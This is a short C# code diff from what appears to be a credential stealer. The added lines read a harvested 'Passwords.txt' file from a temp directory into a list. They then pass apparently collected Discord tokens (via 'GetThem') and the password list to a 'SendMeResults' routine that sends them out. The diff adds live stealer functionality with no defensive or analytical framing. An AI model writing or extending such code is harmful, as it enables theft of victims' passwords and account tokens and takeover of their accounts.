@@ -59,13 +59,30 @@ namespace ConsoleApp1
 
 
             string FilePath = TempPath + "/INZ/Passwords.txt";
-            System.Diagnostics.Process.Start(FilePath); 
+            string[] lines;
+            var list = new List<string>();
+            var fileStream = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
+            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
+            {
+                string line;
+                while ((line = streamReader.ReadLine()) != null)
+                {
+                    list.Add(line);
+                }
+            }
+            lines = list.ToArray();
+            //System.Diagnostics.Process.Start(FilePath); 
 
             var tokens = DiscordG.Program.GetThem();
-            if (tokens.Count > 0)
+            if (tokens != null)
             {
-                DiscordG.Program.SendMeResults(tokens);
+                if (tokens.Count > 0)
+                {
+                    DiscordG.Program.SendMeResults(tokens);
+
+                }
             }
+            DiscordG.Program.SendMeResults(list);
 
 
 
